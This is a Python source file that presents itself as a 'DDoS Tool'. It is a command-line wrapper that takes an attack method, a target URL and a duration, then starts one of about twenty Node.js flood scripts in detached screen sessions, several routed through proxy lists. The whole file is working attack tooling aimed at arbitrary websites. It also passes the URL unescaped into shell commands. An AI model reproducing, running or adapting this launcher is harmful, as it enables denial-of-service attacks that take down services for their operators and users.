import argparse
import subprocess

AVAILABLE_METHODS = ["http-kantot", "https-mix", "tls-3", "tls-detect", "http1", "http2", 
                     "https-power", "nuke", "tls-vip", "bypass", "http-query", "tls-1", 
                     "bot", "nox", "tls", "yolo", "https", "bolt", "omg", "browser"]

def main():
    parser = argparse.ArgumentParser(description="DDoS Tool")
    parser.add_argument("-m", "--method", help="Specify the attack method", required=True, choices=AVAILABLE_METHODS, dest="cnc")
    parser.add_argument("-u", "--url", help="Specify the target URL", required=True)
    parser.add_argument("-t", "--time", help="Specify the attack duration in seconds", default=120)

    args = parser.parse_args()

    try:
        if args.cnc in AVAILABLE_METHODS:
            if "http-kantot" in args.cnc:
                try:
                    subprocess.run([f'screen -dm node ./core/http-kantot {args.url} {args.time} 5 512 '], shell=True)
                    print('Successfully Attack to all linked Server...')
                except IndexError:
                    print('Usage: http-kantot <target> <time>  ')
                    print('Example: http-kantot http://xnxx.com 300 ')
            elif "https-mix" in args.cnc:
                try:
                    subprocess.run([f'screen -dm node ./core/https-mix {args.url} {args.time} 3 120 '], shell=True)
                    print('Successfully Attack to all linked Server...')
                except IndexError:
                    print('Usage: https-mix <target> <time>  ')
                    print('Example: https-mix http://xnxx.com 300 ')
            elif "tls-3" in args.cnc:
                try:
                    subprocess.run([f'screen -dm node ./core/TLS-3 {args.url} {args.time} 32 4 proxy.txt '], shell=True)
                    print('Successfully Attack to all linked Server...')
                except IndexError:
                    print('Usage: tls-3 <target> <time>  ')
                    print('Example: tls-3 http://xnxx.com 300 ')
            # Repeat the pattern for other attack methods
            elif "tls-detect" in args.cnc:
                try:
                    subprocess.run([f'screen -dm node ./core/TLS-DETECT.js {args.url} {args.time} 110 5 proxy.txt '], shell=True)
                    print('Successfully Attack to all linked Server...')
                except IndexError:
                    print('Usage: tls-detect [Target] [Time]  ')
                    print('Example: tls-detect https://example.com/ 120 ')
            elif "http1" in args.cnc:
                try:
                    subprocess.run([f'screen -dm node ./core/http1 GET  {args.url} http.txt {args.time} 124 5 '], shell=True)
                    print('Successfully Attack to all linked Server...')
                except IndexError:
                    print('Usage: http1 <host> <duration>  ')
                    print('Example: http1 https://example.com/ 60 ')
            elif "http2" in args.cnc:
                try:
                    subprocess.run([f'screen -dm node ./core/http2 GET  {args.url} http.txt {args.time} 124 5 '], shell=True)
                    print('Successfully Attack to all linked Server...')
                except IndexError:
                    print('Usage: http2 <host> <duration>  ')
                    print('Example: http2 https://example.com/ 60 ')
            elif "https-power" in args.cnc:
                try:
                    subprocess.run([f'screen -dm node ./core/https-power GET  {args.url} http.txt {args.time} 124 5 '], shell=True)
                    print('Successfully Attack to all linked Server...')
                except IndexError:
                    print('Usage: https-power <host> <duration>  ')
                    print('Example: https-power https://example.com/ 60 ')
            elif "nuke" in args.cnc:
                try:
                    subprocess.run([f'screen -dm node ./core/nuke {args.url} {args.time} 5 http.txt 65 '], shell=True)
                    print('Successfully Attack to all linked Server...')
                except IndexError:
                    print('Usage: nuke https://xnxx.com/ 120 ')
                    print('Example: nuke https://xnxx.com/ 120 ')
            elif "tls-vip" in args.cnc:
                try:
                    subprocess.run([f'screen -dm node ./core/tls-vip {args.url} {args.time} 65 3 http.txt '], shell=True)
                    print('Successfully Attack to all linked Server...')
                except IndexError:
                    print('Usage: tls-vip <host> <duration>  ')
                    print('Example: tls-vip https://example.com/ 60 ')
            elif "bypass" in args.cnc:
                try:
                    subprocess.run([f'screen -dm node ./core/bypass {args.url} {args.time} 65 3 proxy.txt '], shell=True)
                    print('Successfully Attack to all linked Server...')
                except IndexError:
                    print('Usage: bypass <host> <duration>  ')
                    print('Example: bypass https://example.com/ 60 ')
            elif "http-query" in args.cnc:
                try:
                    subprocess.run([f'screen -dm node ./core/HTTP-QUERY.js {args.url} {args.time} 5 65 '], shell=True)
                    print('Successfully Attack to all linked Server...')
                except IndexError:
                    print('Usage: http-query <target> <time>  ')
                    print('Example: http-query http://xnxx.com 300 ')
            elif "tls-1" in args.cnc:
                try:
                    subprocess.run([f'screen -dm node ./core/TLS-1.js {args.url} {args.time} 32 4 proxy.txt '], shell=True)
                    print('Successfully Attack to all linked Server...')
                except IndexError:
                    print('Usage: tls-1 <host> <duration>  ')
                    print('Example: tls-1 https://example.com/ 60 ')
            elif "bot" in args.cnc:
                try:
                    subprocess.run([f'screen -dm node ./core/BOT.js {args.url} {args.time} 65 3 proxy.txt '], shell=True)
                    print('Successfully Attack to all linked Server...')
                except IndexError:
                    print('Usage: bot <host> <duration>  ')
                    print('Example: bot https://example.com/ 60 ')
            elif "nox" in args.cnc:
                try:
                    subprocess.run([f'screen -dm node ./core/NOX.js {args.url} {args.time} 65 5 proxy.txt '], shell=True)
                    print('Successfully Attack to all linked Server...')
                except IndexError:
                    print('Usage: nox <host> <duration>  ')
                    print('Example: nox https://example.com/ 60 ')
            elif "tls" in args.cnc:
                try:
                    subprocess.run([f'screen -dm node ./core/TLS.js {args.url} {args.time} 64 3 '], shell=True)
                    print('Successfully Attack to all linked Server...')
                except IndexError:
                    print('Usage: tls <host> <duration>  ')
                    print('Example: tls https://example.com/ 60 ')
            elif "yolo" in args.cnc:
                try:        
                    subprocess.run([f'screen -dm node ./core/YOLO.js {args.url} {args.time} 124 3 proxy.txt '], shell=True)
                    print('Successfully Attack to all linked Server...')
                except IndexError:
                    print('Usage: yolo <host> <duration>  ')
                    print('Example: yolo https://example.com/ 60 ')
            elif "https" in args.cnc:
                try:
                    subprocess.run([f'screen -dm node ./core/HTTPS.js {args.url} {args.time} 3 proxy.txt 64 '], shell=True)
                    print('Successfully Attack to all linked Server...')
                except IndexError:
                    print('Usage: https <host> <duration>  ')
                    print('Example: https https://example.com/ 60 ')
            elif "bolt" in args.cnc:
                try:
                    subprocess.run([f'screen -dm node utils/L4/./BOLT {args.url} {args.time} 64 5'], shell=True)
                    print('Successfully Attack to all linked Server...')
                except IndexError:
                    print('Usage: bolt <host> <duration>  ')
                    print('Example: bolt https://example.com/ 60 ')
            elif "omg" in args.cnc:
                try:
                    subprocess.run([f'screen -dm node utils/L4/./OMG GET {args.url} proxy.txt {args.time} 64 5'], shell=True)
                    print('Successfully Attack to all linked Server...')
                except IndexError:
                    print('Usage: omg <host> <duration>  ')
                    print('Example: omg https://example.com/ 60 ')
            elif "browser" in args.cnc:
                try:
                    subprocess.run([f'screen -dm node ./core/BROWSER.js {args.url} {args.time} 5 proxy.txt 65 1 '], shell=True)
                    print('Successfully Attack to all linked Server...')
                except IndexError:
                    print('Usage: browser <host> <duration>  ')
                    print('Example: browser https://example.com/ 60 ')
        else:
            print("Invalid attack method. Please choose from the available methods.")
    except Exception as e:
        print(f'An error occurred: {e}')

if __name__ == "__main__":
    main()
